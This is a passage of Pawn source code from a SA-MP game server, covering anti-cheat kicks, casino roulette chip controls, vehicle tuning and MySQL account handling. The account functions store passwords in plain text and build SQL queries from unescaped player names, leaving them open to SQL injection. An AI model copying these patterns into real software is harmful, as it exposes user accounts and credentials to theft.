	PreloadAnimLib(playerid,"ON_LOOKERS");
	PreloadAnimLib(playerid,"DEALER");
	PreloadAnimLib(playerid,"CRACK");
	PreloadAnimLib(playerid,"CARRY");
	PreloadAnimLib(playerid,"COP_AMBIENT");
	PreloadAnimLib(playerid,"PARK");
	PreloadAnimLib(playerid,"INT_HOUSE");
	PreloadAnimLib(playerid,"FOOD");
	PreloadAnimLib(playerid,"GANGS");
	PreloadAnimLib(playerid,"KISSING");
	PreloadAnimLib(playerid,"CAR_CHAT");
	PreloadAnimLib(playerid,"DODGE");
	PreloadAnimLib(playerid,"MD_END");
	PreloadAnimLib(playerid,"MUSCULAR");
	PreloadAnimLib(playerid,"MD_CHASE");
	PreloadAnimLib(playerid,"FAT");
	PreloadAnimLib(playerid,"SCRATCHING");
	PreloadAnimLib(playerid,"GYMNASIUM");
	PreloadAnimLib(playerid,"JST_BUISNESS");
	PreloadAnimLib(playerid,"OTB");
	PreloadAnimLib(playerid,"PLAYIDLES");
	PreloadAnimLib(playerid,"ROB_BANK");
	PreloadAnimLib(playerid,"PED");
}
//==============================================================================
stock CheckCarSlap(playerid, newstate)
{
	static oldData[MAX_PLAYERS][2];
	if(newstate == PLAYER_STATE_DRIVER) // Если игрок сидит на водительском месте то...
	{
		new newveh = GetPlayerVehicleID(playerid); // Получаем ID транспортного средства в котором сидит игрок
		if(oldData[playerid][0] == PLAYER_STATE_DRIVER && oldData[playerid][1] != INVALID_VEHICLE_ID && newveh != oldData[playerid][1]) // Если игрок раньше сидел на водительском месте и игрок а автомобиль то...
		{
			KickEx(playerid,121);
			SetVehicleToRespawn(newveh);
			SetVehicleToRespawn(oldData[playerid][1]);
			oldData[playerid] = {PLAYER_STATE_NONE, INVALID_VEHICLE_ID};
			return true;
		}
		oldData[playerid][1] = newveh; // Устанавливаем "старый" ID транспортного средства
	}
	else
	{
		oldData[playerid][1] = INVALID_VEHICLE_ID;
	}
	oldData[playerid][0] = newstate;  // Устанавливаем "старое" состояние игрока
	return true;
}
//==============================================================================
stock KickEx(playerid,errorcode)
{
	if(PlayerInfo[playerid][pAdmin] != 0) return SendMes(playerid, COLOR_YELLOW, "[A] Администратора невозможно кикнуть (#%d) ",errorcode);
	new string[128];
	if(errorcode != 0)
	{
		SendMes(playerid, COLOR_YELLOW, "Вы были отсоединены от сервера! Код античита: (#%d)",errorcode);
		SendClientMessage(playerid, COLOR_LIGHTRED, "Если вы посчитали, что это ошибка - сделайте скриншот F8");
		PlayerPlaySound(playerid, 6001, 0.0, 0.0, 0.0);
		format(string, 128, "[A] » Игрок %s (ID: %d) кикнут (#%d)",PlayerInfo[playerid][pSendername], playerid,errorcode);
		switch(errorcode)
		{
		case 65435: format(string, 128, "[A] » Игрок %s (ID: %d) кикнут (AC: SandBoxie  (#%d))",PlayerInfo[playerid][pSendername], playerid,errorcode);
		case 6131: format(string, 128, "[A] » Игрок %s (ID: %d) кикнут (AC: Air Brake  (#%d))",PlayerInfo[playerid][pSendername], playerid,errorcode);
		case 8122: format(string, 128, "[A] » Игрок %s (ID: %d) кикнут (AC: GunCheat  (#%d))",PlayerInfo[playerid][pSendername], playerid , errorcode);
		case 1188: format(string, 128, "[A] » Игрок %s (ID: %d) кикнут (AC: SpeedHack  (#%d))",PlayerInfo[playerid][pSendername], playerid,errorcode);
		case 3233: format(string, 128, "[A] » Игрок %s (ID: %d) кикнут (AC: CarFlood  (#%d))",PlayerInfo[playerid][pSendername], playerid,errorcode);
		case 1233: format(string, 128, "[A] » Игрок %s (ID: %d) кикнут (AC: JetPack  (#%d))",PlayerInfo[playerid][pSendername], playerid,errorcode);
		case 12011: format(string, 128, "[A] » Игрок %s (ID: %d) кикнут (AC: INVLogin  (#%d))",PlayerInfo[playerid][pSendername], playerid,errorcode);
			//сВОБОДНОcase 0244: format(string, 128, "[A] >> Игрок %s (ID: %d) кикнут (AC: 0xFF SOB  (#%d))",PlayerInfo[playerid][pSendername], playerid,errorcode);
		case 5244,5255: format(string, 128, "[A] » Игрок %s (ID: %d) кикнут (AC: FakeKill  (#%d))",PlayerInfo[playerid][pSendername], playerid,errorcode);
			//сВОБОДНО case 8611: format(string, 128, "[A] >> Игрок %s (ID: %d) кикнут (AC: NEW AC TEST  (#%d))",PlayerInfo[playerid][pSendername], playerid,errorcode);
		case 1424: format(string, 128, "[A] » Игрок %s (ID: %d) кикнут (AC: TuneCar  (#%d))",PlayerInfo[playerid][pSendername], playerid,errorcode);
		case 1425: format(string, 128, "[A] » Игрок %s (ID: %d) кикнут (AC: Крашер  (#%d))",PlayerInfo[playerid][pSendername], playerid,errorcode);
		case 331: format(string, 128, "[A] » Игрок %s (ID: %d) кикнут (AC: SpeedHack  (#%d))",PlayerInfo[playerid][pSendername], playerid,errorcode);
		case 4211: format(string, 128, "[A] » Игрок %s (ID: %d) кикнут (AC: NOP:RemoveFVeh  (#%d))",PlayerInfo[playerid][pSendername], playerid,errorcode);
		case 1442: format(string, 128, "[A] » Игрок %s (ID: %d) кикнут (AC: CarColorChange  (#%d))",PlayerInfo[playerid][pSendername], playerid,errorcode);
		case 116,117,118: format(string, 128, "[A] » Игрок %s (ID: %d) кикнут (AC: Crasher2  (#%d))",PlayerInfo[playerid][pSendername], playerid,errorcode);
		case 112: format(string, 128, "[A] » Игрок %s (ID: %d) кикнут (AC: CarFlood & Slap  (#%d))",PlayerInfo[playerid][pSendername], playerid,errorcode);
		case 2312: format(string, 128, "[A] » Игрок %s (ID: %d) кикнут (AC: Fly Hack (#%d))",PlayerInfo[playerid][pSendername], playerid,errorcode);
		case 1171: format(string, 128, "[A] » Игрок %s (ID: %d) кикнут (AC: Cleo TP (#%d))",PlayerInfo[playerid][pSendername], playerid,errorcode);
		case 1125: format(string, 128, "[A] » Игрок %s (ID: %d) кикнут (AC: Sobeit Weapons (#%d))",PlayerInfo[playerid][pSendername], playerid,errorcode);
		case 8881: format(string, 128, "[A] » Игрок %s (ID: %d) кикнут (AC: MGInVeh (#%d))",PlayerInfo[playerid][pSendername], playerid,errorcode);
		}
		SendAdminMessage(COLOR_BLUE, string);
		Log("KickLog",string);
		GKick(playerid);
	}
	else
	{
		format(string, 128, "[A] » Игрок %s (ID: %d) кикнут (без кода ошибки)",PlayerInfo[playerid][pSendername], playerid);
		SendAdminMessage(COLOR_BLUE, string);
		GKick(playerid);
	}
	return true;
}
//==============================================================================
stock IsAnDMZone(playerid)
{
	if(IsPlayerInRangeOfPoint(playerid, 28.0,1476.4379,-1739.5688,13.5938)) return true;
	if(IsPlayerInRangeOfPoint(playerid, 35.0,1790.3820,-1908.6573,13.3969)) return true;
	if(IsPlayerInRangeOfPoint(playerid, 15.0,-2029.8953,-116.5111,1035.1719)) return true;
	if(IsPlayerInRangeOfPoint(playerid, 50.0,2204.5186,1763.2113,1077.2328)) return true;
	if(IsPlayerInRangeOfPoint(playerid, 28.0,1226.4379,-1816.5688,16.5938)) return true;
	if(IsPlayerInRangeOfPoint(playerid, 25.0,1192.1299,-1349.5962,1584.9851)) return true;
	if(IsPlayerInRangeOfPoint(playerid, 25.0,-294.1514,-1376.8458,9.2382)) return true;
	if(IsPlayerInRangeOfPoint(playerid, 25.0,-2046.3590,-94.3248,35.1718)) return true;
	if(IsPlayerInRangeOfPoint(playerid, 25.0,-1987.4501,136.6183,27.5391)) return true;
	if(IsPlayerInRangeOfPoint(playerid, 25.0,1481.8170,-1743.8406,13.5469)) return true;
	if(IsPlayerInRangeOfPoint(playerid, 28.0,364.2054,173.6028,1008.3828)) return true;
	return false;
}
//==============================================================================
stock SaveVehicleTuning(playerid)
{
	new i = GetPVarInt(playerid, "PlayerCar");
	PlayerInfo[playerid][cVehcoms][0]=GetVehicleComponentInSlot(i, CARMODTYPE_SPOILER);
	PlayerInfo[playerid][cVehcoms][1]=GetVehicleComponentInSlot(i, CARMODTYPE_HOOD);
	PlayerInfo[playerid][cVehcoms][2]=GetVehicleComponentInSlot(i, CARMODTYPE_ROOF);
	PlayerInfo[playerid][cVehcoms][3]=GetVehicleComponentInSlot(i, CARMODTYPE_SIDESKIRT);
	PlayerInfo[playerid][cVehcoms][4]=GetVehicleComponentInSlot(i, CARMODTYPE_LAMPS);
	PlayerInfo[playerid][cVehcoms][5]=GetVehicleComponentInSlot(i, CARMODTYPE_NITRO);
	PlayerInfo[playerid][cVehcoms][6]=GetVehicleComponentInSlot(i, CARMODTYPE_EXHAUST);
	PlayerInfo[playerid][cVehcoms][7]=GetVehicleComponentInSlot(i, CARMODTYPE_WHEELS);
	PlayerInfo[playerid][cVehcoms][8]=GetVehicleComponentInSlot(i, CARMODTYPE_STEREO);
	PlayerInfo[playerid][cVehcoms][9]=GetVehicleComponentInSlot(i, CARMODTYPE_HYDRAULICS);
	PlayerInfo[playerid][cVehcoms][10]=GetVehicleComponentInSlot(i, CARMODTYPE_FRONT_BUMPER);
	PlayerInfo[playerid][cVehcoms][11]=GetVehicleComponentInSlot(i, CARMODTYPE_REAR_BUMPER);
	PlayerInfo[playerid][cVehcoms][12]=GetVehicleComponentInSlot(i, CARMODTYPE_VENT_RIGHT);
	PlayerInfo[playerid][cVehcoms][13]=GetVehicleComponentInSlot(i, CARMODTYPE_VENT_LEFT);
	format(PlayerInfo[playerid][cVehcom], 64, "%d,%d,%d,%d,%d,%d,%d,%d,%d,%d,%d,%d,%d,%d",
	PlayerInfo[playerid][cVehcoms][0],PlayerInfo[playerid][cVehcoms][1],PlayerInfo[playerid][cVehcoms][2],
	PlayerInfo[playerid][cVehcoms][3],PlayerInfo[playerid][cVehcoms][4],PlayerInfo[playerid][cVehcoms][5],
	PlayerInfo[playerid][cVehcoms][6],PlayerInfo[playerid][cVehcoms][7],PlayerInfo[playerid][cVehcoms][8],
	PlayerInfo[playerid][cVehcoms][9],PlayerInfo[playerid][cVehcoms][10],PlayerInfo[playerid][cVehcoms][11],
	PlayerInfo[playerid][cVehcoms][12],PlayerInfo[playerid][cVehcoms][13]);
}
//==============================================================================
stock SaveVehicleColor(playerid,color1,color2)
{
	PlayerInfo[playerid][cColor][0] = color1;
	PlayerInfo[playerid][cColor][1] = color2;
}
//==============================================================================
stock ShowSTODialog(playerid)
{
	ShowPlayerDialog(playerid,D_CTO+1,DIALOG_STYLE_LIST,"Тюнинг меню","[1] Покраска\n[2] Гидравлика\n[3] Закись азота\n[3] Диски\n[4] Покрасочные работы\n[5]{c0c0c0} Спойлер\n[6]{c0c0c0} Передний бампер\n[7]{c0c0c0} Задний бампер\n[8]{c0c0c0} Боковые юбки\n[9]{c0c0c0} Крыша","Далее","Выход");
	return true;
}
//==============================================================================
stock Stavkarul1down(playerid)
{
	switch(NumberFishka[playerid])
	{
	case 2,3,5,6,8,9,11,12,14,15,17,18,20,21,23,24,26,27,29,30,32,33,35,36,38,39:
		{
			fishechkay[playerid]-=0.25;
			SetObjectPos(Fishka[playerid],fishechkax[playerid],fishechkay[playerid], 1006.0690);
			NumberFishka[playerid] -=1;
		}
	case 1,4,7,10:
		{
			fishechkay[playerid]=1619.0749;
			if (UseRoulette[playerid]==2)
			{
				fishechkax[playerid]=2242.2783;
				SetObjectPos(Fishka[playerid],fishechkax[playerid],fishechkay[playerid], 1006.0690);
				NumberFishka[playerid] =40;
			}
			else if (UseRoulette[playerid]==1)
			{
				fishechkax[playerid]=2230.6701;
				SetObjectPos(Fishka[playerid],fishechkax[playerid],fishechkay[playerid], 1006.0690);
				NumberFishka[playerid] =40;
			}
		}
	case 40:
		{
			fishechkay[playerid]=1618.8292;
			if (UseRoulette[playerid]==2)
			{
				fishechkax[playerid]=2242.1469;
				SetObjectPos(Fishka[playerid],fishechkax[playerid],fishechkay[playerid], 1006.0690);
				NumberFishka[playerid] =43;
			}
			else if (UseRoulette[playerid]==1)
			{
				fishechkax[playerid]=2230.5387;
				SetObjectPos(Fishka[playerid],fishechkax[playerid],fishechkay[playerid], 1006.0690);
				NumberFishka[playerid] =43;
			}
		}
	case 41:
		{
			fishechkay[playerid]=1618.8292;
			if (UseRoulette[playerid]==2)
			{
				fishechkax[playerid]=2242.7469;
				SetObjectPos(Fishka[playerid],fishechkax[playerid],fishechkay[playerid], 1006.0690);
				NumberFishka[playerid] =45;
			}
			else if (UseRoulette[playerid]==1)
			{
				fishechkax[playerid]=2231.1387;
				SetObjectPos(Fishka[playerid],fishechkax[playerid],fishechkay[playerid], 1006.0690);
				NumberFishka[playerid] =45;
			}
		}
	case 42:
		{
			fishechkay[playerid]=1618.8292;
			if (UseRoulette[playerid]==2)
			{
				fishechkax[playerid]=2243.3469;
				SetObjectPos(Fishka[playerid],fishechkax[playerid],fishechkay[playerid], 1006.0690);
				NumberFishka[playerid] =47;
			}
			else if (UseRoulette[playerid] ==1)
			{
				fishechkax[playerid]=2231.7387;
				SetObjectPos(Fishka[playerid],fishechkax[playerid],fishechkay[playerid], 1006.0690);
				NumberFishka[playerid] =47;
			}

		}
	case 43..48:
		{
			fishechkay[playerid]=1619.5603;
			if (UseRoulette[playerid]==2)
			{
				fishechkax[playerid]=2241.9082;
				SetObjectPos(Fishka[playerid],fishechkax[playerid],fishechkay[playerid], 1006.0690);
				NumberFishka[playerid] =0;
			}
			else if (UseRoulette[playerid]==1)
			{
				fishechkax[playerid]=2230.2999;
				SetObjectPos(Fishka[playerid],fishechkax[playerid],fishechkay[playerid], 1006.0690);
				NumberFishka[playerid] =0;
			}
		}
	case 13,16,19,22:
		{
			fishechkay[playerid]=1619.0749;
			if (UseRoulette[playerid]==2)
			{
				fishechkax[playerid]=2242.8863;
				SetObjectPos(Fishka[playerid],fishechkax[playerid],fishechkay[playerid], 1006.0690);
				NumberFishka[playerid] =41;
			}
			else if (UseRoulette[playerid]==1)
			{
				fishechkax[playerid]=2231.2781;
				SetObjectPos(Fishka[playerid],fishechkax[playerid],fishechkay[playerid], 1006.0690);
				NumberFishka[playerid] =41;
			}
		}
	case 25,28,31,34:
		{
			fishechkay[playerid]=1619.0749;
			if (UseRoulette[playerid]==2)
			{
				fishechkax[playerid]=2243.4943;
				SetObjectPos(Fishka[playerid],fishechkax[playerid],fishechkay[playerid], 1006.0690);
				NumberFishka[playerid] =42;
			}
			else if (UseRoulette[playerid]==1)
			{
				fishechkax[playerid]=2231.886;
				SetObjectPos(Fishka[playerid],fishechkax[playerid],fishechkay[playerid], 1006.0690);
				NumberFishka[playerid] =42;
			}
		}
	}
	return true;
}
//==============================================================================
stock Stavkarul1right(playerid)
{
	switch(NumberFishka[playerid])
	{
	case 1..36:
		{
			fishechkax[playerid]+=0.152;
			SetObjectPos(Fishka[playerid],fishechkax[playerid],fishechkay[playerid], 1006.0690);
			NumberFishka[playerid] +=3;
		}
	case 37..39:
		{
			fishechkay[playerid]=1619.5603;
			if (UseRoulette[playerid] == 2)
			{
				fishechkax[playerid]=2241.9082;
				SetObjectPos(Fishka[playerid],fishechkax[playerid],fishechkay[playerid], 1006.0690);
				NumberFishka[playerid] =0;
			}
			else if (UseRoulette[playerid]==1)
			{
				fishechkax[playerid]=2230.2999;
				SetObjectPos(Fishka[playerid],fishechkax[playerid],fishechkay[playerid], 1006.0690);
				NumberFishka[playerid] =0;
			}
		}
	case 0:
		{
			fishechkax[playerid]+=0.152;
			SetObjectPos(Fishka[playerid],fishechkax[playerid],fishechkay[playerid], 1006.0690);
			NumberFishka[playerid] =2;
		}
	case 40,41:
		{
			fishechkax[playerid]+=0.608;
			SetObjectPos(Fishka[playerid],fishechkax[playerid],fishechkay[playerid], 1006.0690);
			NumberFishka[playerid] +=1;
		}
	case 42:
		{
			fishechkay[playerid]=1619.0749;
			if (UseRoulette[playerid]==2)
			{
				fishechkax[playerid]=2242.2783;
				SetObjectPos(Fishka[playerid],fishechkax[playerid],fishechkay[playerid], 1006.0690);
				NumberFishka[playerid] =40;
			}
			else if (UseRoulette[playerid]==1)
			{
				fishechkax[playerid]=2230.6701;
				SetObjectPos(Fishka[playerid],fishechkax[playerid],fishechkay[playerid], 1006.0690);
				NumberFishka[playerid] =40;
			}
		}
	case 43..47:
		{
			fishechkax[playerid]+=0.3;
			SetObjectPos(Fishka[playerid],fishechkax[playerid],fishechkay[playerid], 1006.0690);
			NumberFishka[playerid] +=1;
		}
	case 48:
		{
			fishechkay[playerid]=1618.8292;
			if (UseRoulette[playerid]==2)
			{
				fishechkax[playerid]=2242.1469;
				SetObjectPos(Fishka[playerid],fishechkax[playerid],fishechkay[playerid], 1006.0690);
				NumberFishka[playerid] =43;
			}
			else if (UseRoulette[playerid]==1)
			{
				fishechkax[playerid]=2230.5387;
				SetObjectPos(Fishka[playerid],fishechkax[playerid],fishechkay[playerid], 1006.0690);
				NumberFishka[playerid] =43;
			}
		}

	}
	return true;
}
//==============================================================================
stock Stavkarul1left(playerid)
{
	switch(NumberFishka[playerid])
	{
	case 4..39:
		{
			fishechkax[playerid]-=0.152;
			SetObjectPos(Fishka[playerid],fishechkax[playerid],fishechkay[playerid], 1006.0690);
			NumberFishka[playerid] -=3;
		}
	case 41,42:
		{
			fishechkax[playerid]-=0.608;
			SetObjectPos(Fishka[playerid],fishechkax[playerid],fishechkay[playerid], 1006.0690);
			NumberFishka[playerid] -=1;
		}
	case 44..48:
		{
			fishechkax[playerid]-=0.3;
			SetObjectPos(Fishka[playerid],fishechkax[playerid],fishechkay[playerid], 1006.0690);
			NumberFishka[playerid] -=1;
		}
	case 43:
		{
			fishechkay[playerid]=1618.8292;
			if (UseRoulette[playerid]==2)
			{
				fishechkax[playerid]=2243.6469;
				SetObjectPos(Fishka[playerid],fishechkax[playerid],fishechkay[playerid], 1006.0690);
				NumberFishka[playerid] =48;
			}
			else if (UseRoulette[playerid]==1)
			{
				fishechkax[playerid]=2232.0387;
				SetObjectPos(Fishka[playerid],fishechkax[playerid],fishechkay[playerid], 1006.0690);
				NumberFishka[playerid] =48;
			}
		}
	case 1..3:
		{
			fishechkay[playerid]=1619.5603;
			if (UseRoulette[playerid]==2)
			{
				fishechkax[playerid]=2241.9082;
				SetObjectPos(Fishka[playerid],fishechkax[playerid],fishechkay[playerid], 1006.0690);
				NumberFishka[playerid] =0;
			}
			else if (UseRoulette[playerid]==1)
			{
				fishechkax[playerid]=2230.2999;
				SetObjectPos(Fishka[playerid],fishechkax[playerid],fishechkay[playerid], 1006.0690);
				NumberFishka[playerid] =0;
			}
		}
	case 40:
		{
			fishechkay[playerid]=1619.0749;
			if (UseRoulette[playerid]==2)
			{
				fishechkax[playerid]=2243.4943;
				SetObjectPos(Fishka[playerid],fishechkax[playerid],fishechkay[playerid], 1006.0690);
				NumberFishka[playerid] =42;
			}
			else if (UseRoulette[playerid]==1)
			{
				fishechkax[playerid]=2231.886;
				SetObjectPos(Fishka[playerid],fishechkax[playerid],fishechkay[playerid], 1006.0690);
				NumberFishka[playerid] =42;
			}
		}
	}
	return true;
}
//==============================================================================
stock Stavkarul1up(playerid)
{
	switch(NumberFishka[playerid])
	{
	case 1,2,4,5,7,8,10,11,13,14,16,17,19,20,22,23,25,26,28,29,31,32,34,35,37,38:
		{
			fishechkay[playerid]+=0.25;
			SetObjectPos(Fishka[playerid],fishechkax[playerid],fishechkay[playerid], 1006.0690);
			NumberFishka[playerid] +=1;
		}
	case 40..42:
		{
			fishechkay[playerid]=1619.5603;
			if (UseRoulette[playerid]==2)
			{
				fishechkax[playerid]=2241.9082;
				SetObjectPos(Fishka[playerid],fishechkax[playerid],fishechkay[playerid], 1006.0690);
				NumberFishka[playerid] =0;
			}
			else if (UseRoulette[playerid]==1)
			{
				fishechkax[playerid]=2230.2999;
				SetObjectPos(Fishka[playerid],fishechkax[playerid],fishechkay[playerid], 1006.0690);
				NumberFishka[playerid] =0;
			}
		}
	case 3,6:
		{
			fishechkay[playerid]=1618.8292;
			if (UseRoulette[playerid]==2)
			{
				fishechkax[playerid]=2242.1469;
				SetObjectPos(Fishka[playerid],fishechkax[playerid],fishechkay[playerid], 1006.0690);
				NumberFishka[playerid] =43;
			}
			else if (UseRoulette[playerid]==1)
			{
				fishechkax[playerid]=2230.5387;
				SetObjectPos(Fishka[playerid],fishechkax[playerid],fishechkay[playerid], 1006.0690);
				NumberFishka[playerid] =43;
			}
		}
	case 9,12:
		{
			fishechkay[playerid]=1618.8292;
			if (UseRoulette[playerid]==2)
			{
				fishechkax[playerid]=2242.4469;
				SetObjectPos(Fishka[playerid],fishechkax[playerid],fishechkay[playerid], 1006.0690);
				NumberFishka[playerid] =44;
			}
			else if (UseRoulette[playerid]==1)
			{
				fishechkax[playerid]=2230.8387;
				SetObjectPos(Fishka[playerid],fishechkax[playerid],fishechkay[playerid], 1006.0690);
				NumberFishka[playerid] =44;
			}
		}
	case 15,18:
		{
			fishechkay[playerid]=1618.8292;
			if (UseRoulette[playerid]==2)
			{
				fishechkax[playerid]=2242.7469;
				SetObjectPos(Fishka[playerid],fishechkax[playerid],fishechkay[playerid], 1006.0690);
				NumberFishka[playerid] =45;
			}
			else if (UseRoulette[playerid]==1)
			{
				fishechkax[playerid]=2231.1387;
				SetObjectPos(Fishka[playerid],fishechkax[playerid],fishechkay[playerid], 1006.0690);
				NumberFishka[playerid] =45;
			}
		}
	case 21,24:
		{
			fishechkay[playerid]=1618.8292;
			if (UseRoulette[playerid]==2)
			{
				fishechkax[playerid]=2243.0469;
				SetObjectPos(Fishka[playerid],fishechkax[playerid],fishechkay[playerid], 1006.0690);
				NumberFishka[playerid] =46;
			}
			else if (UseRoulette[playerid]==1)
			{
				fishechkax[playerid]=2231.4386;
				SetObjectPos(Fishka[playerid],fishechkax[playerid],fishechkay[playerid], 1006.0690);
				NumberFishka[playerid] =46;
			}
		}
	case 27,30:
		{
			fishechkay[playerid]=1618.8292;
			if (UseRoulette[playerid]==2)
			{
				fishechkax[playerid]=2243.3469;
				SetObjectPos(Fishka[playerid],fishechkax[playerid],fishechkay[playerid], 1006.0690);
				NumberFishka[playerid] =47;
			}
			else if (UseRoulette[playerid]==1)
			{
				fishechkax[playerid]=2231.7387;
				SetObjectPos(Fishka[playerid],fishechkax[playerid],fishechkay[playerid], 1006.0690);
				NumberFishka[playerid] =47;
			}
		}
	case 33,36:
		{
			fishechkay[playerid]=1618.8292;
			if (UseRoulette[playerid]==2)
			{
				fishechkax[playerid]=2243.6469;
				SetObjectPos(Fishka[playerid],fishechkax[playerid],fishechkay[playerid], 1006.0690);
				NumberFishka[playerid] =48;
			}
			else if (UseRoulette[playerid]==1)
			{
				fishechkax[playerid]=2232.0387;
				SetObjectPos(Fishka[playerid],fishechkax[playerid],fishechkay[playerid], 1006.0690);
				NumberFishka[playerid] =48;
			}
		}
	case 43,44:
		{
			fishechkay[playerid]=1619.0749;
			if (UseRoulette[playerid]==2)
			{
				fishechkax[playerid]=2242.2783;
				SetObjectPos(Fishka[playerid],fishechkax[playerid],fishechkay[playerid], 1006.0690);
				NumberFishka[playerid] =40;
			}
			else if (UseRoulette[playerid]==1)
			{
				fishechkax[playerid]=2230.6701;
				SetObjectPos(Fishka[playerid],fishechkax[playerid],fishechkay[playerid], 1006.0690);
				NumberFishka[playerid] =40;
			}
		}
	case 45,46:
		{
			fishechkay[playerid]=1619.0749;
			if (UseRoulette[playerid]==2)
			{
				fishechkax[playerid]=2242.8863;
				SetObjectPos(Fishka[playerid],fishechkax[playerid],fishechkay[playerid], 1006.0690);
				NumberFishka[playerid] =41;
			}
			else if (UseRoulette[playerid] ==1)
			{
				fishechkax[playerid]=2231.2781;
				SetObjectPos(Fishka[playerid],fishechkax[playerid],fishechkay[playerid], 1006.0690);
				NumberFishka[playerid] =41;
			}
		}
	case 47,48:
		{
			fishechkay[playerid]=1619.0749;
			if (UseRoulette[playerid]==2)
			{
				fishechkax[playerid]=2243.4943;
				SetObjectPos(Fishka[playerid],fishechkax[playerid],fishechkay[playerid], 1006.0690);
				NumberFishka[playerid] =42;
			}
			else if (UseRoulette[playerid] ==1)
			{
				fishechkax[playerid]=2231.886;
				SetObjectPos(Fishka[playerid],fishechkax[playerid],fishechkay[playerid], 1006.0690);
				NumberFishka[playerid] =42;
			}
		}

	}
	return true;
}
//==============================================================================
stock PutPlayerInVeh(playerid, vehicleid, seatid)
{
	UseEnter[playerid] = true;
	IDVEH[playerid] = vehicleid;
	PutPlayerInVehicle(playerid, vehicleid, seatid);
	return true;
}
#define PutPlayerInVehicle PutPlayerInVeh
//==============================================================================
stock logs(log[], string[])
{
	new write[200], day, mes, god, hour, minn, sec;
	getdate(god, mes, day);
	gettime(hour, minn, sec);
	format(write, sizeof(write), "[%d.%d.%d|%d:%d:%d]%s\r\n", day, mes, god, hour, minn, sec, string);
	new File:hFile = fopen(log, io_append);
	for(new io = 0; io < strlen(write); io++) fputchar(hFile, write[io], false);
	fclose(hFile);
}
//==============================================================================
stock CreateAccount(playerid, pass[])
{
	if(IsTextInvalid(pass)) return SendClientMessage(playerid,-1,"В пароле должны быть только буквы и цифры"),GKick(playerid);
	new ip[16],data[16];
	format(data, 16, "%s",date("%dd.%mm.%yyyy",gettime()));
	GetPlayerIp(playerid, ip, 16);
	new radio = random(sizeof(RADIO));
	format(query, 512, "INSERT INTO "TABLE_ACCOUNT" (name, password, ip, datareg, sex, model, news, mail, referal) VALUES ('%s', '%s', '%s', '%s', %d , %d, %d, '%s', '%s')"
	, PlayerInfo[playerid][pSendername], pass, ip, data,PlayerInfo[playerid][pSex], PlayerInfo[playerid][pModel], radio, PlayerInfo[playerid][pMail], PlayerInfo[playerid][pReferal]);
	mysql_query(query);
	LoadAccount(playerid);
	return true;
}
//==============================================================================
stock LoadAccount(playerid)
{
	new string[64];
	new playername[32];
	GetPlayerName(playerid,playername,32);
	format(query,256, "SELECT * FROM "TABLE_ACCOUNT" WHERE name = '%s'  LIMIT 1",playername);
	mysql_query(query);
	mysql_store_result();
	if(mysql_fetch_row(query) == 1)
	{
		sscanf(query, "p<|>is[32]s[32]s[16]is[32]s[64]iiiis[16]iiiiiiiis[16]s[40]s[160]iiiiis[16]s[20]iiiis[32]s[32]fiiiiis[32]s[32]iiiiiiiiiiiiiiiiiiiifiiiiiiiiiiiiiiiiiis[128]ii",
		PlayerInfo[playerid][pID],
		PlayerInfo[playerid][pSendername],
		PlayerInfo[playerid][pPassword],
		PlayerInfo[playerid][pIP],
		PlayerInfo[playerid][pAdmin],
		PlayerInfo[playerid][pIpPassword],
		PlayerInfo[playerid][pMail],
		PlayerInfo[playerid][pLevel],
		PlayerInfo[playerid][pCash],
		PlayerInfo[playerid][pBank],
		PlayerInfo[playerid][pExp],
		PlayerInfo[playerid][pRegData],
		PlayerInfo[playerid][pLeader],
		PlayerInfo[playerid][pMember],
		PlayerInfo[playerid][pRank],
		PlayerInfo[playerid][pVoennik],
		PlayerInfo[playerid][pWarn],
		PlayerInfo[playerid][pSex],
		PlayerInfo[playerid][pModel],
		PlayerInfo[playerid][pChar],
		PlayerInfo[playerid][pLics],
		PlayerInfo[playerid][pGuns],
		PlayerInfo[playerid][pAmmos],
		PlayerInfo[playerid][pGunSkill][6],
		PlayerInfo[playerid][pMuted],
		PlayerInfo[playerid][pPick],
		PlayerInfo[playerid][pCheckTime],
		PlayerInfo[playerid][pNews],
		PlayerInfo[playerid][pPhones],
		PlayerInfo[playerid][pTexts],
		PlayerInfo[playerid][pJail],
		PlayerInfo[playerid][pJailTime],
		PlayerInfo[playerid][pWanted],
		PlayerInfo[playerid][pWantedTime],
		PlayerInfo[playerid][pWantedWho],
		PlayerInfo[playerid][pWantedReason],
		PlayerInfo[playerid][pHeal],
		PlayerInfo[playerid][pDrugs],
		PlayerInfo[playerid][pMats],
		PlayerInfo[playerid][pCrimes],
		PlayerInfo[playerid][pJob],
		PlayerInfo[playerid][pMarried],
		PlayerInfo[playerid][pWhoMarried],
		PlayerInfo[playerid][pReferal],
		PlayerInfo[playerid][pRefMoney],
		PlayerInfo[playerid][pPayCheck],
		PlayerInfo[playerid][pFish],
		PlayerInfo[playerid][pLottery],
		PlayerInfo[playerid][pVIP],
		PlayerInfo[playerid][pTime],
		PlayerInfo[playerid][pFightStyle],
		PlayerInfo[playerid][pCredits],
		PlayerInfo[playerid][pTotalCredits],
		PlayerInfo[playerid][pSkin1],
		PlayerInfo[playerid][pSkin2],
		PlayerInfo[playerid][pSkin3],
		PlayerInfo[playerid][pSpawnChange],
		PlayerInfo[playerid][pGunSkill][0],
		PlayerInfo[playerid][pGunSkill][1],
		PlayerInfo[playerid][pGunSkill][2],
		PlayerInfo[playerid][pGunSkill][3],
		PlayerInfo[playerid][pGunSkill][4],
		PlayerInfo[playerid][pGunSkill][5],
		PlayerInfo[playerid][pSatiety],
		PlayerInfo[playerid][pHealthS],
		PlayerInfo[playerid][pSportEXP],
		PlayerInfo[playerid][pOnline],
		PlayerInfo[playerid][pZakon],
		PlayerInfo[playerid][ProverkaIP],
		PlayerInfo[playerid][pHospital],
		PlayerInfo[playerid][pWatch],
		PlayerInfo[playerid][pCiggare],
		PlayerInfo[playerid][pSprunk],
		PlayerInfo[playerid][pMask],
		PlayerInfo[playerid][pPhoneBalance],
		PlayerInfo[playerid][pTruckSkill],
		PlayerInfo[playerid][cModel],
		PlayerInfo[playerid][cClass],
		PlayerInfo[playerid][cFuel],
		PlayerInfo[playerid][cColor][0],
		PlayerInfo[playerid][cColor][1],
		PlayerInfo[playerid][cLock],
		PlayerInfo[playerid][cCost],
		PlayerInfo[playerid][cVehcom],
		PlayerInfo[playerid][cPaintjob],
		PlayerInfo[playerid][pDostup]);
		mysql_free_result();
		sscanf(PlayerInfo[playerid][cVehcom], "p<,>a<i>[14]",PlayerInfo[playerid][cVehcoms]);
		LoadMyCar(playerid);
		PlayerLogged[playerid] = true;
		TimeLogged[playerid] = -1;
		TextDrawShowForPlayer(playerid, SiteText);
